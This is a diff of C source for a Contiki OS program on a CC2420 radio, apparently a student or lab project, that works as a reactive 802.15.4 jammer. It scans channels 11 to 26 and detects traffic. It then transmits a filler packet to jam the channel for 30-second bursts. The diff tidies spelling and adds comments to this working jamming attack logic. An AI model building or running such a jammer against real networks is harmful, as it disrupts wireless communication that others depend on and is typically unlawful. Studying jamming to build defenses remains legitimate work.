@@ -29,20 +29,9 @@ typedef struct
   char data[JAMMER_PACKET_LEN];
 } jpacket_t;
 
-bool checkForComonucation = true;
-
+//Variables used for channel switching
+bool checkForCommunication = true;
 int channel = 26;
-
-// time control variables
-unsigned long timeBetweenCecks = 1;
-
-// ENERGEST time conversion
-/*
-static unsigned long
-to_seconds(uint64_t time)
-{
-  return (unsigned long)(time / ENERGEST_SECOND);
-}*/
 
 /*---------------------------------------------------------------------------*/
 
@@ -54,8 +43,7 @@ AUTOSTART_PROCESSES(&jammerProcess);
 
 PROCESS_THREAD(jammerProcess, ev, data)
 {
-  static int comunicationDetected = 0;
-  static struct etimer periodic_timer;
+  static int communicationDetected = 0;
   static unsigned long timerStart;
 
   PROCESS_BEGIN();
@@ -63,8 +51,6 @@ PROCESS_THREAD(jammerProcess, ev, data)
   NETSTACK_RADIO.set_value(RADIO_PARAM_TX_MODE, 0);
   cc2420_driver.set_value(RADIO_PARAM_CCA_THRESHOLD, 55);
 
-  // set timer..
-  etimer_set(&periodic_timer, 5);
   // set channel..
   NETSTACK_RADIO.set_value(RADIO_PARAM_CHANNEL, channel);
   cc2420_set_channel(channel);
@@ -73,38 +59,45 @@ PROCESS_THREAD(jammerProcess, ev, data)
   jpacket_t jpacket;
   memset(&jpacket, 0, sizeof(jpacket_t));
   strcpy(jpacket.data, "The network is now being jammed.The network is now being jammed.");
-  // ENERGEST_OFF(ENERGEST_TYPE_LISTEN);
+
   while (1)
   {
-    if (checkForComonucation)
+    if (checkForCommunication)
     {
-      printf("Starting comunication check\n");
+      //Check for channel activity
+      printf("Starting communication check\n");
       timerStart = clock_seconds();
-      comunicationDetected = 0;
-      while (comunicationDetected <= 5)
+      communicationDetected = 0;
+      while (communicationDetected <= 5)
       {
-
+        //Checks if channel is not clear (this is repeated maximum 6 times)
         if (!NETSTACK_RADIO.channel_clear())
         {
           timerStart = clock_seconds();
-          comunicationDetected++;
-          printf("Comonucation detected   ");
+          communicationDetected++;
+          printf("Communication detected   ");
         }
+
+        //If no activity jump to next channel
         if (clock_seconds() - timerStart >= 12)
         {
-          comunicationDetected = 0;
+          communicationDetected = 0;
           channel++;
           if (channel > 26)
           {
+            //Reset channel interval (11-26)
             channel = 11;
           }
+
           timerStart = clock_seconds();
           cc2420_set_channel(channel);
           printf("Channel changed    ");
         }
       }
-      printf("\nComonucation confirmed starting jamming\n");
-      checkForComonucation = false;
+
+      //If channel is active for long enough, launch jamming attack
+      printf("\nCommunication confirmed starting jamming\n");
+      checkForCommunication = false;
       timerStart = clock_seconds();
       NETSTACK_RADIO.on();
     }
@@ -115,9 +108,10 @@ PROCESS_THREAD(jammerProcess, ev, data)
     // Update all energest times
     energest_flush();
 
+    //Stop jamming on current channel, and listen for activity starting from current channel
     if (clock_seconds() - timerStart >= 30)
     {
-      checkForComonucation = true;
+      checkForCommunication = true;
       timerStart = clock_seconds();
       NETSTACK_RADIO.off();
     }
